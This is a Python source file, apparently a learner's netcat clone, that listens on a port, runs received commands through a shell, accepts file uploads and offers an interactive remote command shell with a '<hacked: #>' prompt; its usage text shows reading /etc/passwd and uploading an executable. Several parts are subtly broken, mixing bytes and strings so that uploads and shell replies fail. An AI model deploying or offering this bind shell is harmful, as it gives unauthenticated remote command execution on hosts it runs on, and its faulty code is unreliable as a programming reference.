import sys
import socket
import getopt
import threading
import subprocess

# Global variables
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

# for handling command-line arguments and calling other functions

def usage():
    print("My Netcat Tool")
    print()
    print("Usage: netcat.py -t target_host -p port")
    print("-l --listen              - listen on [host]:[port] for incoming connections")
    print("-e --execute=file_to_run - execute the given file upon receiving a connection")
    print("-c --command            - initialize a command shell")
    print("-u --upload=destination  - upon receiving connection upload a file and write to [destination]")
    print("\n\nExamples:")
    print("netcat.py -t 192.168.0.1 -p 5555 -l -c")
    print("netcat.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("netcat.py -t 192.168.0.1 -p 5555 -l -e=\"cat /ect/passwd\"")
    print ("echo 'ABCDEFGHI' | ./netcat.py -t 192.168.11.12 -p 135")
    sys.exit(0)


def client_sender(buffer):
    # Creating a socket object for client to send data
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        #connect to our target host and port
        client.connect((target, port))

        if len(buffer):
            client.send(buffer.encode())
        
        while True:

            # now wait for data back
            recv_len = 1
            response = ""

            while recv_len:

                data = client.recv(4096)
                recv_len = len(data)
                response += data.decode("utf-8", errors="ignore")

                if recv_len < 4096:
                    break
            
            print(response)

            # wait for more input
            try:
                buffer = input(response)
            except KeyboardInterrupt:
                print("\n[*] User terminated.")
                client.close()
                sys.exit(0)
            buffer += "\n"

            #send it of
            client.send(buffer.encode())
    
    except Exception as e:
        print("[*] Exception! Exiting.")

        # tear down connection
        client.close()

def server_loop():
   
    global target 

    # if no target is defined, we listen on all interfaces

    if not len(target):
        target = "0.0.0.0"
    print("[*] Listening on %s:%d" % (target, port))
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    server.bind((target, port))
    server.listen(5)
    print("[*] Listening on %s:%d" % (target, port))
    while True:
        client_socket, addr = server.accept()

        # spin off a thread to handle our clients
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()

def run_command(command):

    # trim the newline
    command = command.rstrip()

    # run the command and get the output back
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = b"Failed to execute command. \r\n"
    
    return output

def client_handler(client_socket):
    global upload
    global execute
    global command

    # check for upload

    if len(upload_destination):

        # read in all of the bytes and write to our destination 
        file_buffer = b""

        # keep reading data until none is available

        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data.decode()
        
        # now we take these bytes and try to write them out

        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            # acknowledge that we wrote the file out
            client_socket.send(("Successfully saved file to %s\r\n" % upload_destination).encode())

        except: 
            client_socket.send(("Failed to save file to %s\r\n" % upload_destination).encode())
    # check for command execution
    if len(execute):

        # run the command
        output = run_command(execute)

        client_socket.send(output.encode())
    # now we go into another loop if a command shell was requested 
    if command:

        while True:
            #show a simple prompt
            client_socket.send(("<hacked: #> ").encode())
            # now we receive until we see a linefeed (enter key)

            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024).decode()
            
            # send back the command output
            response = run_command(cmd_buffer)

            # send back the response 
            client_socket.send(response)

    
def main():
    global listen
    global port
    global target
    global upload_destination
    global execute
    global command 
    global upload

    if not len(sys.argv[1:]):
        usage()
        # read the commanad ]line ptions

    try:
        opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu", ["help", "listen", "excute","target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()
    
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l" , "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u" ,"--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"
        
    # Are we going to listen or just send data from stdin?
    if not listen and len(target) and port > 0:
        # read from commandline
        # this will block, so send CTRL-D if not sending inpt to stdin
        buffer = sys.stdin.read()

        # send data to target host 
        client_sender(buffer)
    
    # we are going to listen and potentially  upload things, execute commands, and drop a shell back 
    if listen:
        print("[*] Listening on")
        server_loop()



main()



        